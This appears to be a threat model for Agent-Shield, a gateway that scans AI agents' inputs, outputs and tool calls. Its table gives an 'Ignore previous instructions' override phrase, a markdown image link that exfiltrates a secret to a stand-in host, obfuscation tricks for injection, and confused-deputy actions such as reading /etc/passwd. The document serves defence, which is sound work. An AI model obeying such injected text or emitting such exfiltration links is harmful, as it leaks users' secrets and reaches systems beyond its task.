# Threat model

Agent-Shield assumes the **agent's model can be manipulated** by anything it reads, and limits the damage when that happens.

## Assets

- Credentials and personal data the agent can see or reach.
- Systems the agent's tools can touch (filesystem, internal network, databases, payments).
- The integrity of the record of what the agent did.

## Attackers and entry points

| Entry point | Example | Control |
|---|---|---|
| Direct prompt injection | "Ignore previous instructions and ..." | `/v1/scan/input` rule set, block threshold |
| Indirect injection | Hidden instruction in a web page, document or tool result | `source=document` / `tool_output` scored 25% stricter |
| Obfuscation | Zero-width characters, fullwidth letters, Unicode tag smuggling, base64 | Normalisation before matching, decode-and-rescan |
| Data exfiltration through output | `![x](https://evil/i.png?d=<secret>)`, leaked tokens | `/v1/scan/output` blocks exfiltration links and secrets |
| Confused-deputy tool use | Agent tricked into reading `/etc/passwd`, calling the metadata service, dropping a table | Default-deny tool policy with argument constraints |
| Excessive agency | Large payment, external email | `needs_approval` verdicts and approval thresholds |
| Abuse and flooding | One agent hammering the gateway | Per-agent token bucket, `429` with `Retry-After` |
| Log tampering | Editing history after an incident | SHA-256 hash chain, `/v1/audit/verify` |

## Out of scope / known gaps

- **Paraphrase and novel attacks.** Rules cannot enumerate every phrasing. Combine with model-side defences, output filtering and minimal privileges.
- **Non-English and semantic attacks** are only caught where they match the encoded patterns.
- **DNS rebinding / hostnames resolving to private IPs.** URL checks are syntactic. Keep `allowed_hosts` tight in the policy.
- **Audit log authenticity.** The chain detects edits but not the wholesale replacement of the log by someone who can recompute every hash. Ship the head hash to an external, append-only store for stronger guarantees.
- **Single instance.** The rate limiter and in-memory audit buffer are per process.
- **The gateway must be called.** It enforces policy for agents that route through it; it is not a sandbox around the agent process.
